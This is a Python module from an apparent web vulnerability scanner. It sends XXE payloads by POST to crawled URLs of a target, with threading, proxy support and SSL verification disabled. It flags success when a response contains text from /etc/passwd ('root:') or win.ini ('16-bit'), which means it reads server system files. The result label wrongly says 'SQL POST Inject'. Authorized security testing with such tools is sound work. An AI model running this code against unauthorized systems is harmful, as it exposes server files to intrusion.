# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from pub.com.outprint import ATPrintInfoSuc,ATPrintInfoPostSuc
from attack.Attack_Tihuan import attack_tihuan_url_canshu_work
from attack.Attack_Tihuan import post_attack_tihuan_url_canshu_work
from attack.Attack_Tihuan import _header_attack_tihuan_url_canshu_work
from requests.packages.urllib3 import disable_warnings
from rich.progress import Progress
from concurrent.futures import ThreadPoolExecutor,as_completed,wait
disable_warnings()

class XXEPoc:
    def xxe_check_post(self,url,data):
        baseurl = url.split("&attack&")[0]
        try:
            req = requests.post(baseurl,headers=self.__headers,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout,data=data)
            if "root:" in req.text or "16-bit" in req.text:
                return True, url, "SQL POST Inject", req.request.headers,req.request.body
        except Exception:
            pass
    def main(self, target, attack_url_list,progress,__craw_post_url_list):
        xxe_poc = _header_attack_tihuan_url_canshu_work("xxe")
        if target['proxy']:
            if "://" in target['proxy']:
                self.__proxies = {"https": target['proxy'], "http": target['proxy']}
            else:
                self.__proxies = {"https": "http://" + target['proxy'], "http": "http://" + target['proxy']}
        else:
            self.__proxies = target['proxy']
        self.__base_url = target['url'].strip("/ ")
        self.__headers = {"User-Agent": target['header']}
        self.__ssl = target['ssl']
        self.__threads = int(target['threads'])
        self.__timeout = int(target['timeout'])

        post_att_url_list = post_attack_tihuan_url_canshu_work(self.__base_url,__craw_post_url_list,"xxe")
        if post_att_url_list:
            tasks = progress.add_task("[b blue]XXE检测...", total=len(post_att_url_list))
            with ThreadPoolExecutor(self.__threads) as pool:
                futures = [pool.submit(self.xxe_check_post, base_url,data) for base_url in post_att_url_list for data in xxe_poc]
                for future in as_completed(futures):
                    result = future.result()
                    if result is not None:
                        flag, suc_url, poc_name, req,body = result
                        ATPrintInfoPostSuc(suc_url, poc_name, req,body)
                    progress.update(tasks, advance=1)
            wait(futures)






